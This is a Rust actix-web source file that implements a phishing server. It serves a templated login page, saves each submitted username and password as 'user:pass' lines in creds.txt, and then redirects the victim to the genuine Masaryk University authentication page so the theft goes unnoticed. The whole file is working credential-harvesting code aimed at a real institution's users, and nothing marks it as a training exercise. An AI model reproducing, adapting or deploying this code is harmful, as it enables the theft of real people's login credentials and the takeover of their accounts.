use actix_files;
use actix_web::{get, post, web, App, HttpResponse, HttpServer, Responder};
use chrono::Local;
use std::fs;
use std::fs::OpenOptions;
use std::io::prelude::*;
use serde::Deserialize;

#[derive(Deserialize)]
struct FormData {
    credential_0: String,
    credential_1: String,
}

fn change_time() -> String {
    let date = Local::now();
    let date_act = date.format("%d. %m. %Y  |  %H:%M").to_string();
    let path = "templates/index.html";
    let data = fs::read_to_string(path).unwrap();
    let new = data.replace("{{ date_time }}", &date_act);

    return new;
}

fn save_creds(creds: String) -> std::io::Result<()> {
    let mut file = OpenOptions::new()
        .create(true)
        .write(true)
        .append(true)
        .open("creds.txt")
        .unwrap();

    if let Err(e) = writeln!(file, "{}", creds) {
        eprintln!("Couldn't write to file: {}", e);
    }
    Ok(())
}

#[get("/")]
async fn hello() -> impl Responder {
    HttpResponse::Ok()
        .content_type("text/html; charset=utf-8")
        .body(change_time())
}

#[post("/")]
async fn echo(form: web::Form<FormData>) -> impl Responder {
    let credential_0: String = form.credential_0.clone().to_owned();
    let credential_1: &str = &form.credential_1;
    let login = credential_0.clone() + ":"+ credential_1;

    save_creds(login).unwrap();
    HttpResponse::Found()
        .insert_header(("Location", "https://is.muni.cz/auth/"))
        .finish()
}

#[actix_web::main]
async fn main() -> std::io::Result<()> {
    HttpServer::new(|| {
        App::new()
            .service(actix_files::Files::new("static", "./static").show_files_listing())
            .service(hello)
            .service(echo)
    })
    .bind(("127.0.0.1", 8080))?
    .run()
    .await
}
